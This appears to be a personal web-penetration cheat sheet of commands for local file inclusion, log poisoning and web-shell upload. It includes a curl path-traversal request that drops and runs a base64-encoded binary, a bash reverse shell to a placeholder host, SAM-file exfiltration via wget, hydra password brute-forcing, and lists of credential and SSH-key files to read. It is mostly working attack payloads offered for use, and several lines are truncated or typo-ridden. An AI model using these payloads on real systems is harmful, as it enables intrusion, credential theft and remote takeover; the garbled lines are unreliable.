### check for ssrf or RFI 

```
kali
sudo tcpdump icmp -i tun0

Webserver
python3 <webserver-url> -c "ping -c4 <attacker-ip>"
``` 

### LFI
```
file=../../../../../proc/self/environ

change user-agent: <?php system[$_GET['cmd']); ?>

<url>/console?file=../../../../../proc/self/environ?cmd=id
```
```
/home/user/.ssh/id_rsa
/var/log/auth.log
try ssh poisinong
nc -nv <ip> 22
omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /var/log/auth.log
```
```
/etc/passwd
 /etc/shadow
 /etc/knockd.conf     // port knocking config
../../../../../../../xampp/apache/logs/access.log
```
```
 http://url/index.php?page=../../../etc/passwd
 http://url/index.php?page=../../../etc/shadow
 http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub
 http://url/index.php?page=../../../home/user/.ssh/id_rsa
 http://url/index.php?page=../../../home/user/.ssh/authorized_key

 http://url/index.php?page=../../../etc/passwd%0

 http://url/index.php?page=php://filter/convert.base64-encode/resource=index
 http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=inde
```
```
curl -s --path-as-is http://192.168.207.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash -d 'echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoLapoAgARXInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA= | base64 -d > /tmp/exploit; chmod +x /tmp/exploit; /tmp/exploit'
```
```
id_rsa
id_ecdsa
id_ed25519
id_dsa
id_rsa.pub
id_ecdsa.pub
id_ed25519.pub
id_dsa.pub
*.pem
*.key
id_rsa.old
id_rsa.bak
authorized_keys
```
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/etc/hostname
/etc/issue
/etc/mysql/my.cnf
/etc/httpd/conf/httpd.conf
/etc/php.ini
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/var/log/auth.log
/var/log/secure
/var/log/apache2/access.log
/var/log/apache2/error.log
~/.bash_history
~/.ssh/id_rsa
~/.ssh/id_dsa
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/id_dsa
```

### PDF to text 
```
pdftotext *.pdf
```

### PUT 
```
 curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.ph
```

### Webdav
```
cadaver http://192.168.1.103/dav/
 put /tmp/shell.php
```

### Bruteforcing 
Want to exfiltrate binary data embedded in HTML tags?
```
 wget -qO- 'http://X.X.X.X/vulnpage?vulparam=..\..\..\..\..\..\..\..\..\..\..%5cWINDOWS%5cRepair%5cSAM%00en' |perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' > SAM
```
2. PHP LFI, but no file (php, phar) gets executed?
```
data:text/plain,<?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
```
4. Trying to get a password on a web interface?
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt X.X.X.X http-post-form "/URL/Login:User=^USER&password=^PASS:F=<String indicating attempt has failed>" -I
```

5. transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]

```
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:rdp
# OR, if having a different connect error, also try:
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:tls
# and if you want to have files and clipboard there:
xfreerdp +clipboard /u:user /p:'password' /v:X.X.X.X /d:domain /sec:<whatever> /drive:<absolute path to your local folder>,/
```
